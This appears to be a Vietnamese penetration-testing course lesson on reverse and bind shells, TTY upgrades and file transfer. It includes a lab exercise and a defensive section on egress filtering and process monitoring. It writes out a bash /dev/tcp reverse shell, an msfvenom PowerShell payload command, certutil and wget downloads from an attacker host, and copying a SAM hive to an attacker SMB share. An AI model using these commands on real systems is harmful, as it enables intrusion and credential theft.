@@ -1,0 +1,320 @@
+---
+title: "Shell, truyền file và nâng cấp TTY"
+code: "2.7"
+level: 2
+summary: "Khai thác được một lỗ hổng chỉ là nửa đầu. Nửa sau là có một cửa sổ dòng lệnh dùng được tử tế trên máy mục tiêu, và biết cách chuyển công cụ xuống, kéo dữ liệu về giữa hai máy."
+duration: "70 phút"
+updated: "2026-11-09"
+prereq: ["1.4", "1.5", "1.6"]
+objectives:
+  - "Phân biệt được bind shell và reverse shell, và giải thích được vì sao reverse shell phổ biến hơn trong thực tế"
+  - "Nâng cấp được một shell thô thành TTY đầy đủ để dùng được tab, Ctrl-C, trình soạn thảo"
+  - "Truyền được file hai chiều giữa máy tấn công và máy mục tiêu, trên cả Linux và Windows"
+  - "Nói được góc nhìn phòng thủ: vì sao lọc luồng ra và theo dõi tiến trình con lại bắt được phần lớn các shell này"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import SequenceDiagram from '../../components/sim/SequenceDiagram.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Bạn vừa mở được một khe cửa vào ngôi nhà. Nhưng đứng ngoài thò tay qua khe thì làm được rất ít. Bạn cần mở hẳn cửa để ra vào thoải mái, và cần một lối chuyển đồ đạc qua lại. Trong pentest, "cửa" là một **shell** (cửa sổ dòng lệnh điều khiển máy từ xa) dùng được, còn "lối chuyển đồ" là cách **truyền file**.
+
+Rất nhiều người mới khai thác được lỗ hổng rồi khựng lại ngay sau đó, vì cái shell nhận được quá thô: không gõ được tab, bấm Ctrl-C là mất kết nối, không chạy được trình soạn thảo.
+
+Họ tưởng mình bị kẹt kỹ thuật, trong khi chỉ cần biết ba bước nâng cấp. Bài này sửa đúng chỗ đó, rồi dạy tiếp phần hay bị quên: làm sao đưa công cụ xuống máy mục tiêu và mang dữ liệu về, khi máy đó chẳng có gì ngoài một dòng lệnh.
+
+## Kiến thức chính
+
+### Bind shell và reverse shell
+
+Sau khi khai thác xong một lỗ hổng, bạn cần máy mục tiêu "nói chuyện" được với bạn qua một kênh dòng lệnh. Có hai chiều để mở kênh đó:
+
+- **Bind shell:** máy mục tiêu mở một cổng và chờ; máy tấn công kết nối vào. Vấn đề: tường lửa của mục tiêu thường chặn kết nối lạ đi *vào*.
+- **Reverse shell:** máy mục tiêu *chủ động gọi ra* tới máy tấn công đang lắng nghe. Phổ biến hơn nhiều, vì tường lửa thường dễ dãi với kết nối đi *ra* hơn là đi vào.
+
+<SequenceDiagram
+  client:visible
+  title="Hai chiều mở shell"
+  actors={['Máy tấn công', 'Máy mục tiêu']}
+  scenarios={[
+    {
+      name: 'Bind shell',
+      steps: [
+        { from: 1, to: 1, label: 'mở cổng 4444, chờ', note: 'Máy mục tiêu lắng nghe trên một cổng. Nhưng tường lửa vào thường chặn kết nối lạ, nên cách này hay thất bại.', tone: 'bad' },
+        { from: 0, to: 1, label: 'kết nối tới 4444', note: 'Máy tấn công kết nối vào cổng đó để lấy shell. Chỉ chạy được nếu cổng không bị tường lửa chặn.' },
+      ],
+    },
+    {
+      name: 'Reverse shell',
+      steps: [
+        { from: 0, to: 0, label: 'lắng nghe trên 443', note: 'Máy tấn công mở một "người nghe" (listener), ví dụ bằng nc, chờ máy mục tiêu gọi về.' },
+        { from: 1, to: 0, label: 'gọi ra tới máy tấn công', note: 'Máy mục tiêu chủ động kết nối ra. Tường lửa thường cho phép kết nối đi ra, nhất là trên cổng web như 443.', tone: 'good' },
+        { from: 0, to: 1, label: 'gửi lệnh qua kết nối đó', note: 'Kết nối đã mở hai chiều; máy tấn công gõ lệnh, máy mục tiêu trả kết quả.', tone: 'good' },
+      ],
+    },
+  ]}
+/>
+
+Trong lab, bạn mở "người nghe" bằng `nc -lvnp 443`, rồi làm cho máy mục tiêu chạy một lệnh gọi về (qua chính lỗ hổng vừa khai thác ở bài 2.3 hoặc 2.8).
+
+OSCP yêu cầu hiểu cơ chế này chứ không cần thuộc lòng payload (đoạn lệnh dùng để tấn công); có nhiều bản payload sẵn (ví dụ trang PayloadsAllTheThings) cho từng ngôn ngữ, và việc của bạn là hiểu nó đủ để chọn đúng bản và sửa đúng địa chỉ IP, cổng cho tình huống của mình.
+
+<Callout type="note" label="Hai payload gọi về hay dùng nhất (sửa IP/cổng cho đúng)">
+Sau khi mở <code>nc -lvnp 443</code> trên Kali, đây là hai dòng bạn ép mục tiêu chạy để nó gọi về:<br />
+- <strong>Linux (bash):</strong> <code>bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1</code> — mở một bash tương tác và nối thẳng vào/ra của nó qua TCP về máy bạn.<br />
+- <strong>Windows (PowerShell):</strong> một dòng <code>powershell -e &lt;base64&gt;</code>; cách gọn nhất để sinh nó là <code>msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f psh</code> (bài 3.7), hoặc lấy mẫu từ PayloadsAllTheThings.<br />
+Đổi <code>10.10.14.5</code> thành IP Kali và cổng cho khớp người nghe. Cổng 443/80 hay lọt tường lửa ra hơn cổng lạ.
+</Callout>
+
+### Vì sao shell đầu tiên thường "thô"
+
+Ngay khi kết nối vừa chạy, bạn gõ thử vài lệnh và thấy có gì không ổn: tab không tự hoàn thành, bấm mũi tên lên không ra lịch sử, và Ctrl-C (thứ bạn dùng cả đời để dừng một lệnh) lại làm rớt luôn cả kết nối. Nguyên nhân là shell nhận được ban đầu thường không phải một **TTY** đầy đủ.
+
+TTY (viết tắt của teletype) là lớp mà một cửa sổ terminal thật cung cấp thêm cho shell: nó xử lý tab, lịch sử lệnh, Ctrl-C, màu, và cho phép chạy các chương trình tương tác như `ssh`, `su`, `vim`. Shell thô thiếu lớp này nên rất khó dùng. Dấu hiệu nhận ra: bấm Ctrl-C là rớt phiên, không có tab, `sudo` báo "no tty present".
+
+### Nâng cấp TTY (Linux)
+
+Tin tốt là sửa được, bằng một quy trình bốn dòng gần như ai làm pentest Linux cũng gõ theo phản xạ: dùng Python (hầu như máy Linux nào cũng có) để xin một pseudo-TTY, rồi chỉnh lại terminal phía máy Kali cho khớp:
+
+<Lenh noi="Bốn dòng chạy ở hai nơi khác nhau: dòng 1 trong shell thô vừa nhận được trên máy mục tiêu, các dòng sau trên chính máy Kali (nơi bạn đang có người nghe nc)" muc="Biến một shell thô, khó dùng, thành một terminal gần như đầy đủ: có tab, Ctrl-C không làm rớt phiên">
+
+<Terminal title="Nâng cấp shell thô thành TTY đầy đủ">
+
+```text
+python3 -c 'import pty; pty.spawn("/bin/bash")'   (trên shell thô)
+    rồi bấm Ctrl-Z để tạm dừng, về máy tấn công gõ:
+stty raw -echo; fg
+    gõ Enter vài lần, rồi đặt loại terminal:
+export TERM=xterm
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `python3 -c '...'`: chạy đoạn Python ngắn ngay trong shell thô. `import pty; pty.spawn("/bin/bash")` xin một pseudo-TTY thật rồi mở `bash` bên trong — bash lúc này mới có tab, mũi tên lên để lấy lệnh cũ.
+- `Ctrl-Z`: **không phải gõ vào shell mục tiêu**, mà là tạm đẩy phiên về nền trên chính terminal của bạn (Kali), để gõ hai lệnh tiếp theo trên Kali.
+- `stty raw -echo`: lệnh chạy trên Kali, chỉnh terminal của bạn sang chế độ "thô" để nó không tự xử lý các phím đặc biệt nữa, nhường việc đó cho bash phía mục tiêu. `fg`: đưa phiên đã tạm dừng trở lại (foreground).
+- `export TERM=xterm`: gõ lại trên shell mục tiêu (giờ đã có tab), khai báo loại terminal để các chương trình như `vim`, `less` hiển thị đúng.
+
+</div>
+
+<div slot="doc">
+
+Không có "output" cố định ở đây — dấu hiệu thành công là: gõ Tab tự hoàn thành tên file, bấm mũi tên lên lấy lại lệnh cũ, và `Ctrl-C` dừng một lệnh con mà **không làm mất cả phiên**. Nếu `pty.spawn` báo lỗi "No module named pty" hoặc không có Python: dùng `script /dev/null -c bash` để thay thế.
+
+</div>
+
+</Lenh>
+
+Trên Windows, lựa chọn tốt hơn là lấy một phiên đẹp hơn ngay từ đầu (ví dụ qua WinRM/evil-winrm khi có thông tin đăng nhập, bài 3.9), vì PowerShell không có cùng vấn đề TTY như shell Linux.
+
+## Thực hành: truyền file hai chiều
+
+Có shell dùng được rồi, bạn sẽ liên tục cần làm hai việc ngược nhau: chuyển công cụ *xuống* máy mục tiêu (linPEAS để săn leo thang ở bài 3.1, một exploit đã biên dịch) và kéo dữ liệu *về* máy mình để phân tích (file cấu hình, hash). Nguyên tắc chung cho cả hai chiều giống nhau: một bên mở "điểm phát", bên kia "kéo về". Ta bắt đầu với chiều xuống.
+
+### Dựng máy chủ trên máy tấn công
+
+<Lenh noi="Terminal trên máy Kali, trong thư mục chứa công cụ muốn gửi (ví dụ linpeas.sh)" muc="Biến thư mục hiện tại thành một trang web tạm, để máy mục tiêu tải file về">
+
+<Terminal title="Máy tấn công phát file qua HTTP">
+
+```text
+kali@lab:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `python3 -m http.server 80`: chạy module `http.server` có sẵn trong Python như một web server đơn giản, phát toàn bộ file trong thư mục hiện tại, lắng nghe ở cổng 80.
+- Đổi `80` thành cổng khác nếu 80 cần quyền root hoặc đã bị dùng (ví dụ `8000`).
+
+</div>
+
+<div slot="doc">
+
+- `Serving HTTP on 0.0.0.0 port 80 ...`: server đã chạy và **đứng chờ**, không trả lại dấu nhắc. Mỗi lần có máy tải file, một dòng log hiện ra (địa chỉ máy đó, file nào, mã trạng thái).
+- Dừng bằng `Ctrl+C` khi xong.
+
+</div>
+
+</Lenh>
+
+Máy chủ tạm đã phát xong, giờ sang phía nhận. Cách tải khác nhau tuỳ máy mục tiêu là Linux hay Windows, nên ta xem lần lượt cả hai.
+
+### Kéo về phía Linux
+
+<Lenh noi="Trên shell đã có của máy mục tiêu Linux (ví dụ tài khoản www-data)" muc="Tải file công cụ vừa phát ở trên xuống máy mục tiêu">
+
+<Terminal title="Trên mục tiêu Linux">
+
+```text
+www-data@target:~$ wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh
+www-data@target:~$ curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh`: tải file từ URL, `-O` (chữ hoa) chỉ định tên/đường dẫn file lưu ra. `10.10.14.5` là địa chỉ máy Kali của bạn.
+- `curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh`: làm cùng việc bằng `curl`, cờ `-o` (chữ thường) ở đây cũng là chỉ định file lưu ra.
+- Hai lệnh là hai cách làm cùng một việc; máy mục tiêu có `wget` hay `curl` thì dùng cái có sẵn.
+- `/tmp/`: thư mục tạm, hầu như tài khoản nào cũng ghi được vào đây.
+
+</div>
+
+<div slot="doc">
+
+- Không báo lỗi, không có output dài: tải thành công. `wget` thường in thêm vài dòng tiến trình (`100%` khi xong); `curl` im lặng hơn.
+- Báo `Connection refused` hoặc treo lâu: kiểm tra lại máy chủ HTTP ở bước trên còn chạy không, và địa chỉ IP `10.10.14.5` đúng là IP của Kali trong mạng lab chưa.
+- Kiểm tra file đã tải đúng chưa bằng `ls -la /tmp/linpeas.sh`.
+
+</div>
+
+</Lenh>
+
+### Kéo về phía Windows
+
+PowerShell không có `wget` hay `curl` kiểu Linux, nhưng có lệnh tương đương để tải file qua HTTP từ chính máy chủ tạm bạn vừa dựng:
+
+<Lenh noi="Trên shell PowerShell đã có của máy mục tiêu Windows" muc="Tải một công cụ (ví dụ winPEAS, nc.exe) từ máy Kali xuống máy mục tiêu Windows">
+
+<Terminal title="Trên mục tiêu Windows (PowerShell)">
+
+```text
+PS C:\> Invoke-WebRequest -Uri http://10.10.14.5/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe
+PS C:\> certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `Invoke-WebRequest`: lệnh PowerShell tải file từ một URL (tương đương `wget`/`curl`). `-Uri`: địa chỉ cần tải. `-OutFile`: đường dẫn lưu ra.
+- `certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe`: `certutil` vốn là công cụ quản lý chứng chỉ của Windows, nhưng cũng tải được file qua HTTP — hữu ích khi `Invoke-WebRequest` bị chặn. `-f` ép ghi đè nếu file đã tồn tại.
+- `C:\Windows\Temp\`: thư mục tạm trên Windows, tương đương `/tmp` của Linux.
+
+</div>
+
+<div slot="doc">
+
+- Không có output nghĩa là thành công; kiểm tra lại bằng `dir C:\Windows\Temp\wp.exe`.
+- Báo đỏ "Unable to connect to the remote server": kiểm tra lại IP Kali và máy chủ HTTP còn chạy.
+- `certutil` để tải file là hành vi hay bị EDR/Defender để ý (xem Góc phòng thủ), vì nó không phải mục đích gốc của công cụ.
+
+</div>
+
+</Lenh>
+
+### Kéo dữ liệu về máy tấn công
+
+Giờ tới chiều ngược lại. Bạn đã tìm được một hash hay một file cấu hình trên máy mục tiêu và muốn mang về máy mình để bẻ khoá (bài 2.6) hay đọc kỹ. Trên Windows, cách gọn nhất là mở một "share" SMB tạm trên chính máy Kali và để máy mục tiêu chép file vào đó, giống như chép vào một ổ USB ảo:
+
+<Lenh noi="Lệnh đầu trên máy Kali; lệnh sau trên shell PowerShell của máy mục tiêu Windows" muc="Mở một 'share' SMB tạm trên máy Kali để lấy một file về từ máy mục tiêu Windows">
+
+<Terminal title="Nhận file qua SMB (tiện cho Windows)">
+
+```text
+kali@lab:~$ impacket-smbserver share ./loot -smb2support
+# trên mục tiêu Windows:
+PS C:\> copy C:\loot\sam.hive \\10.10.14.5\share\
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-smbserver share ./loot -smb2support`: mở một máy chủ SMB giả trên Kali. `share` là **tên share**; `./loot` là thư mục trên Kali ánh xạ vào share đó (tạo trước nếu chưa có); `-smb2support` để Windows hiện đại nói chuyện được (mặc định chỉ hỗ trợ SMB1).
+- `copy C:\loot\sam.hive \\10.10.14.5\share\`: lệnh copy bình thường của Windows, chỉ khác đích là một share mạng — cú pháp `\\IP\tên-share\`.
+- Phần `# trên mục tiêu Windows:` là chú thích của bài, không gõ.
+
+</div>
+
+<div slot="doc">
+
+- Trên Kali, `impacket-smbserver` in log mỗi khi có máy kết nối hoặc ghi file — thấy dòng log là có máy đang copy file tới.
+- Sau khi lệnh `copy` trên Windows chạy xong (không báo lỗi), file sẽ xuất hiện trong thư mục `./loot` trên Kali.
+- Lỗi `Access is denied` phía Windows: tài khoản hiện tại không đọc được file nguồn (ví dụ `sam.hive` cần quyền cao); lỗi kết nối: kiểm tra tường lửa có chặn cổng SMB (445) không.
+
+</div>
+
+</Lenh>
+
+<Callout type="note">
+Hãy ghi lại mọi file bạn thả lên mục tiêu và dọn chúng khi xong, kể cả trong lab. Trong một đợt pentest thật, danh sách này thuộc về báo cáo (bài 4.1) để khách hàng biết cần dọn gì, và trong phòng thi, để lại rác trên máy có thể bị trừ điểm.
+</Callout>
+
+<LabBrief
+  ten="Lấy một shell thật và nâng cấp nó"
+  muctieu="Tự mở một reverse shell từ Metasploitable 2 về Kali, nâng lên TTY đầy đủ, rồi chuyển một file qua lại cả hai chiều"
+  may="Metasploitable 2"
+  ip="10.10.14.20"
+  thoigian="30 phút"
+  xong="Shell của bạn chạy được lệnh tương tác như sudo -l mà không bị treo, và bạn có một file đã chuyển thành công theo mỗi chiều, kiểm lại bằng md5sum"
+>
+
+1. Mở người nghe trên Kali, rồi kích hoạt một reverse shell trên Metasploitable 2 (dùng chính tài khoản `msfadmin` qua SSH hoặc một dịch vụ bạn đã khai thác ở bài 2.2–2.5).
+2. Nâng shell thô lên TTY đầy đủ theo đúng ba bước trong bài.
+3. Chuyển một file từ Kali xuống máy mục tiêu bằng một trong các cách đã học.
+4. Chuyển một file khác theo chiều ngược lại.
+5. Kiểm tra cả hai file còn nguyên vẹn bằng `md5sum` hoặc `sha256sum` ở cả hai đầu.
+
+<div slot="goiy1">
+Phần "Nâng cấp shell thô lên TTY đầy đủ" có đúng ba lệnh cần gõ theo thứ tự; bỏ sót một bước là lý do hay gặp nhất khiến `sudo` hay `vim` bị treo.
+</div>
+
+<div slot="goiy2">
+Mục "Thực hành: truyền file hai chiều" liệt kê cách chuyển file qua máy chủ HTTP (Kali xuống máy đích) và qua máy chủ SMB hoặc `scp` (ngược lại).
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: hai giá trị `md5sum` của cùng một file (một đầu gửi, một đầu nhận) khớp nhau.
+- Shell "đơ" khi gõ `sudo -l` hoặc Ctrl+C làm mất luôn kết nối: chưa nâng TTY đúng cách, làm lại ba bước đó trước khi thử tiếp.
+- File chuyển xong nhưng mở bị lỗi: có thể bạn quên chế độ nhị phân khi dùng một kênh dựa trên văn bản (ví dụ dán qua terminal thay vì tải file thật).
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là người giám sát mạng, hãy nhìn lại từng bước ở trên và tự hỏi: cái nào mình bắt được? <strong>Lọc luồng ra (egress filtering)</strong> là lớp hiệu quả nhất, vì reverse shell dựa vào máy nội bộ chủ động gọi ra ngoài. Chặn kết nối ra không cần thiết, chỉ cho ra qua proxy có kiểm soát, là chặn được phần lớn reverse shell ngay từ bước mở kết nối.
+
+<strong>Phát hiện hành vi</strong> bắt được phần còn lại: một tiến trình web server (www-data, IIS) bỗng sinh ra `bash`, `nc` hay `powershell` và mở kết nối ra là rất bất thường, và EDR hay Sysmon ghi lại đúng chuỗi tiến trình con này (bài 8.1). <strong>Chặn công cụ tải về</strong> bắt được bước truyền file: giám sát `certutil`, `wget`, `Invoke-WebRequest` chạy từ tài khoản dịch vụ, và bật ghi log PowerShell để thấy lệnh thật đã chạy. <strong>Phân đoạn mạng</strong> hạn chế máy chủ nào được mở kết nối tới đâu, để một shell có mở được cũng khó chuyển tiếp sang máy khác.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Khai thác xong rồi vật lộn với shell thô.** Không biết cách nâng cấp TTY, nhiều người tưởng mình đã bế tắc kỹ thuật, trong khi chỉ cần bốn dòng ở trên. Đừng cố làm việc tiếp với một shell thô, hãy nâng cấp trước.
+- **Dùng bind shell trước, rồi bỏ cuộc khi thất bại.** Tường lửa vào chặn gần như luôn, và người mới hay kết luận lỗ hổng không khai thác được. Hãy thử reverse shell trước, vì nó thành công nhiều hơn hẳn trong thực tế.
+- **Quên mở người nghe (`nc -lvnp`) trước khi kích hoạt payload.** Nghe ngược thì không có gì để nghe, và payload gọi về chẳng có ai trả lời. Luôn mở listener trước, bấm payload sau.
+- **Chọn cổng lạ cho reverse shell.** Cổng như 4444 dễ bị tường lửa ra chặn hoặc bị hệ thống giám sát để ý ngay. Cổng web như 443 hay 80 thường dễ đi ra hơn vì giống lưu lượng bình thường.
+- **Thả file lên mục tiêu rồi quên dọn và quên ghi lại.** Đến lúc viết báo cáo, bạn không nhớ đã để lại gì ở đâu, và khách hàng (hay giám khảo) phát hiện rác bạn để lại.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao reverse shell phổ biến hơn bind shell?', options: ['Vì nó mã hoá tốt hơn', 'Vì tường lửa thường cho phép kết nối đi ra dễ hơn kết nối lạ đi vào', 'Vì nó nhanh hơn'], answer: 1, explain: 'Bind shell cần mở cổng vào trên mục tiêu, thường bị tường lửa vào chặn; reverse shell cho mục tiêu gọi ra.' },
+    { q: 'Nâng cấp TTY giúp gì?', options: ['Tăng tốc độ mạng', 'Có tab, Ctrl-C không rớt phiên, chạy được chương trình tương tác như su, vim', 'Xoá log'], answer: 1, explain: 'Shell thô thiếu lớp TTY nên khó dùng; nâng cấp cho bạn một terminal đầy đủ.' },
+    { q: 'Lệnh nào thường dùng để kéo file về mục tiêu Windows?', options: ['Invoke-WebRequest hoặc certutil -urlcache', 'nmap', 'hashcat'], answer: 0, explain: 'Trên Windows, PowerShell Invoke-WebRequest và certutil là hai cách tải file phổ biến.' },
+    { q: 'Biện pháp phòng thủ nào chặn hiệu quả nhiều reverse shell?', options: ['Đổi màn hình nền', 'Lọc luồng ra: chặn kết nối ra không cần thiết và phát hiện web server sinh ra shell', 'Tắt máy in'], answer: 1, explain: 'Reverse shell cần máy nội bộ gọi ra; egress filtering và phát hiện chuỗi tiến trình bất thường là lớp chặn chính.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Reverse shell (mục tiêu gọi ra) thắng bind shell, vì tường lửa thường dễ dãi với luồng ra hơn luồng vào. Mở listener trước, kích hoạt payload sau.
+- Shell đầu tiên thường thô. Nâng cấp TTY bằng `pty.spawn` rồi chỉnh `stty` để có một terminal dùng được, trước khi làm việc tiếp.
+- Truyền file đi theo một mẫu chung: một bên mở máy chủ (HTTP hoặc SMB), bên kia kéo về. Dùng mẫu đó cho cả hai chiều, xuống và lên.
+- Mọi bước ở đây đều để lại dấu vết: luồng ra bất thường, tiến trình web sinh shell, công cụ tải file lạ. Dọn file và ghi lại những gì mình đã thả lên máy.
